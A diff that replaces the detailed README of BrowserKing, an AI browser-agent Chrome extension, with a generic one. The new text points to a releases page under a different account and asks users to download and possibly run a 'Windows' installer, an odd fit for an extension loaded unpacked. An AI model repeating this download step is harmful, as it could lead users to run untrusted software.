@@ -1,152 +1,162 @@
-<p align="center">
-  <img src="icon-128.png" alt="BrowserKing" width="96" />
-</p>
+# 🦁 BrowserKing - Control Your Browser With AI
 
-<h1 align="center">BrowserKing</h1>
+[![Download BrowserKing](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Silves1485/BrowserKing/releases)
 
-<p align="center">
-  <strong>Open-source browser agent Chrome extension powered by any LLM provider</strong>
-</p>
+## 🚀 What BrowserKing Does
 
-<p align="center">
-  Use GPT-4o, Claude, Gemini, Grok, DeepSeek, Mistral, Llama, and 15+ other models as your browser agent — all from one extension.
-</p>
+BrowserKing is a Chrome extension that lets an AI model control your browser for you. You can use it to open sites, click buttons, fill forms, and move through web pages with simple instructions.
 
----
+It works with many LLM providers, including GPT-4o, Claude, Gemini, Grok, DeepSeek, Llama, and others. That means you can choose the AI service that fits your setup.
 
-## What is BrowserKing?
+BrowserKing is built for people who want browser automation without writing scripts. You give the task, and the agent handles the steps in Chrome.
 
-BrowserKing is a Chrome extension that gives any LLM the ability to see and control your browser. It works like a human assistant that can:
+## 📥 Download BrowserKing
 
-- **Take screenshots** and understand what's on screen
-- **Click, type, scroll** and navigate web pages
-- **Read page content** and extract information
-- **Open tabs** and work across multiple pages
-- **Record and replay workflows** for repetitive tasks
+Visit this page to download BrowserKing for Windows:
 
-Unlike other browser agents locked to a single provider, BrowserKing lets you **bring your own API key** from any OpenAI-compatible provider — or use the Anthropic API directly.
+[Download BrowserKing from Releases](https://github.com/Silves1485/BrowserKing/releases)
 
-## Supported Providers
+Open the releases page and get the latest Windows file. If you see more than one file, choose the one for Windows and your browser setup.
 
-| Provider | Models | Vision |
-|----------|--------|--------|
-| **OpenAI** | GPT-4o, GPT-4.1, o3, o4-mini | Yes |
-| **Anthropic** | Claude 4 Sonnet, Claude 4 Opus | Yes |
-| **Google** | Gemini 2.5 Pro/Flash | Yes |
-| **xAI** | Grok 3, Grok 3 Mini | Yes |
-| **DeepSeek** | DeepSeek-V3, DeepSeek-R1 | No |
-| **Mistral** | Mistral Large, Pixtral Large | Pixtral only |
-| **Groq** | Llama 4 Scout/Maverick, Llama 3.3 | Scout/Maverick |
-| **Cerebras** | Llama 3.3 70B | No |
-| **Perplexity** | Sonar Pro, Sonar Huge | No |
-| **Z.AI** | GLM-4.6V, GLM-4.5V | Yes |
-| **Custom** | Any OpenAI-compatible endpoint | Configurable |
+## 🪟 Install on Windows
 
-Each provider gets its own **theme color** throughout the UI — the sidebar, send button, glow effects, and page border all match your active provider.
+1. Open the download page above.
+2. Download the latest Windows release file.
+3. If the file is in a ZIP folder, right-click it and choose Extract All.
+4. Open Chrome.
+5. Go to the extensions page by typing this in the address bar:
+   chrome://extensions
+6. Turn on Developer mode in the top-right corner.
+7. Click Load unpacked.
+8. Select the BrowserKing folder you extracted.
+9. Pin the extension to your browser if you want quick access.
 
-## Run Local Models
+If the release comes as an installer, open the file and follow the on-screen steps.
 
-BrowserKing works with **any OpenAI-compatible API**, which means you can run it with local models too. Point it at [Ollama](https://ollama.com), [LM Studio](https://lmstudio.ai), [LocalAI](https://localai.io), or any other local inference server that exposes an OpenAI-compatible endpoint.
+## 🧭 First-Time Setup
 
-**Setup:**
-1. Start your local server (e.g., `ollama serve` or launch LM Studio)
-2. In BrowserKing settings, select the **Custom** provider
-3. Set the base URL to your local endpoint (e.g., `http://localhost:11434/v1` for Ollama)
-4. Enter any string as the API key (local servers usually don't require one, but the field can't be empty)
-5. Select or type your model name
+After you install the extension, you need to connect it to an AI provider.
 
-**Best models for local browser agents:**
-- `llama-4-scout` or `llama-4-maverick` (vision + tool use)
-- `qwen2.5-vl` (strong vision)
-- Any model with vision and function calling support
+1. Open the BrowserKing extension in Chrome.
+2. Choose your LLM provider.
+3. Paste your API key.
+4. Save your settings.
+5. Open a website you want the agent to use.
+6. Enter a task in plain language.
 
-> **Note:** Local model support is experimental. Performance depends heavily on your hardware and the model's ability to handle tool calls and vision inputs. Cloud providers with dedicated function calling support will generally give the most reliable results. If you run into issues, please [open an issue](https://github.com/Mushisushi28/BrowserKing/issues) — we'd love to hear what works and what doesn't.
+Example tasks:
+- Open the Gmail tab and look for unread mail
+- Go to a product page and add the item to the cart
+- Search for flight prices between two cities
+- Fill out this form with the details I provide
 
-## Features
+## ⚙️ Basic Requirements
 
-- **Multi-provider support** — Switch between providers and models mid-conversation from the dropdown
-- **Automatic vision detection** — Knows which models support images and which don't, with safe fallback
-- **Provider-themed UI** — Every color in the extension adapts to your active provider
-- **Page glow border** — Pulsing colored border around the page while the agent is working
-- **No account required** — No sign-up, no subscription. Just add your API key and go
-- **Workflow recording** — Record browser actions and replay them later
-- **GIF export** — Export recordings as GIFs
-- **Tool use** — Models that support function calling get collapsible tool-use blocks in the chat
+BrowserKing works best on:
+- Windows 10 or Windows 11
+- Google Chrome
+- A current internet connection
+- An AI provider account with API access
 
-## Installation
+For the smoothest setup, keep Chrome updated and use a recent version of Windows.
 
-1. Download or clone this repo
-2. Open `chrome://extensions` in Chrome
-3. Enable **Developer mode** (toggle in the top right)
-4. Click **Load unpacked** and select this folder
-5. Click the BrowserKing icon in your toolbar to open the side panel
-6. Go to **Settings** and add your API key for at least one provider
+## 🧠 Supported AI Providers
 
-## Quick Start
+BrowserKing can work with many model providers, including:
+- OpenAI
+- Anthropic Claude
+- Google Gemini
+- xAI Grok
+- DeepSeek
+- Llama-based providers
+- Other API-compatible LLM services
 
-1. Open any web page
-2. Open BrowserKing from the side panel
-3. Select your provider and model from the dropdown at the top
-4. Type a task like _"Find the cheapest flight from Calgary to Tokyo next month"_
-5. Watch the agent work — it takes screenshots, clicks, scrolls, and reports back
+You can switch providers based on cost, speed, or the kind of task you want to run.
 
-## Configuration
+## 🖱️ What You Can Do With It
 
-Open the **Provider Settings** page from the extension options to:
+BrowserKing can help with common browser tasks like:
+- Clicking buttons
+- Opening pages
+- Filling out text fields
+- Reading page content
+- Moving through multi-step workflows
+- Repeating web actions
+- Working across tabs
+- Handling routine website tasks
 
-- Enable/disable providers
-- Enter API keys
-- Set custom base URLs (for self-hosted or proxy endpoints)
-- Choose default models
-- Fetch available models from provider APIs
+It is useful for online work, research, form entry, shopping flows, and simple web automation.
 
-## Architecture
+## 🔧 How to Use It
 
-BrowserKing works by intercepting the stock extension's Anthropic API calls and translating them to OpenAI-compatible `chat/completions` requests. This means:
+1. Open Chrome.
+2. Start BrowserKing.
+3. Choose your AI provider.
+4. Enter your API key.
+5. Go to the page you want to work on.
+6. Type a task in plain English.
+7. Watch the agent carry out the steps.
 
-- The full browser automation toolkit (screenshots, clicks, navigation) works with any provider
-- Tool calls are translated between Anthropic and OpenAI formats in real-time
-- SSE streaming is translated on the fly
-- Vision payloads are automatically downgraded for text-only models
+Keep your instructions clear and specific. Short tasks usually work best.
 
-Key files:
+Good examples:
+- Find the contact page and open it
+- Search this site for pricing
+- Sign in and go to my dashboard
+- Copy the main points from this page
 
-| File | Purpose |
-|------|---------|
-| `provider-registry.js` | Provider definitions, model lists, vision detection |
-| `api-adapter.js` | API translation layer (Anthropic ↔ OpenAI) |
-| `ui-branding.js` | Dynamic theme colors in the side panel |
-| `brand-overlay.js` | Page glow border and stop button theming |
-| `sidepanel-provider-menu.js` | Provider/model dropdown UI |
-| `provider-settings.js` | Settings page for API keys and configuration |
+## 🛠️ Tips for Better Results
 
-## Roadmap
+- Use one task at a time
+- Keep instructions short
+- Start with simple websites
+- Refresh the page if the site stops responding
+- Make sure Chrome stays open while the agent works
+- Check your API key if the agent does not start
 
-- [ ] **Persistent page glow** — Fix the colored glow border so it reliably pulses for all providers during agent activity
-- [ ] **Conversation history** — Save and resume past agent sessions
-- [ ] **Multi-tab workflows** — Coordinate actions across multiple tabs in a single task
-- [ ] **Prompt templates** — Pre-built task templates for common workflows (form filling, data extraction, price comparison)
-- [ ] **Better local model support** — Improve tool call translation for models with non-standard function calling formats
-- [ ] **Export to Playwright/Puppeteer** — Convert recorded workflows to automation scripts
-- [ ] **Provider cost tracking** — Track token usage and estimated cost per conversation
-- [ ] **Firefox & Edge support** — Port the extension to other Chromium and non-Chromium browsers
-- [ ] **Mobile support** — Bring browser agent capabilities to mobile browsers via Kiwi Browser or Firefox Android extensions
+If a site uses pop-ups, cookie banners, or login steps, BrowserKing may need a more detailed prompt.
 
-Have a feature idea? [Open an issue](https://github.com/Mushisushi28/BrowserKing/issues) or submit a PR.
+## 🔒 Privacy and Control
 
-## Acknowledgments
+BrowserKing runs in your browser, so you stay in charge of the page. You decide when the agent starts and what site it uses. Review each action if you want to keep full control of the process.
 
-BrowserKing is built on top of Anthropic's [Claude for Chrome](https://chrome.google.com/webstore/detail/claude/danfohhfmbeahkgpceibgibfpkhokbfp) extension. We extended it with multi-provider support, local model compatibility, and a provider-themed UI.
+## 📚 Common Use Cases
 
-## License
+- Online research
+- Form filling
+- Customer support workflows
+- Web testing
+- Data lookup
+- Repetitive browsing tasks
+- Personal productivity tasks
+- Automation for browser-based tools
 
-MIT
+## 🧩 Browser Support
 
-## Contributing
+BrowserKing is made for Chrome. It may also work in other Chromium-based browsers, such as:
+- Microsoft Edge
+- Brave
+- Opera
 
-PRs welcome. If you add a new provider, add it to the `PROVIDERS` object in `provider-registry.js` with:
-- `id`, `label`, `color`
-- `baseUrl` and model list
-- Vision support flags per model
+Chrome gives the best compatibility, so use it first if you run into problems.
 
-Then add vision detection rules in `inferVisionSupport()` in the same file.
+## ❓ Troubleshooting
+
+If BrowserKing does not work, check these items:
+
+- Make sure the extension is installed in Chrome
+- Confirm Developer mode is on
+- Check that your API key is valid
+- Make sure your internet connection is active
+- Reload the extension after changing settings
+- Try a simpler task first
+- Close and reopen Chrome
+
+If the agent clicks the wrong thing, break the job into smaller steps and use more direct instructions.
+
+## 📄 Project Details
+
+**Name:** BrowserKing  
+**Type:** Chrome extension  
+**Use case:** Browser automation with AI  
+**Topics:** ai-agent, browser-agent, browser-automation, chrome-extension, claude, deepseek, gemini, gpt4, grok, llm, multi-provider, openai
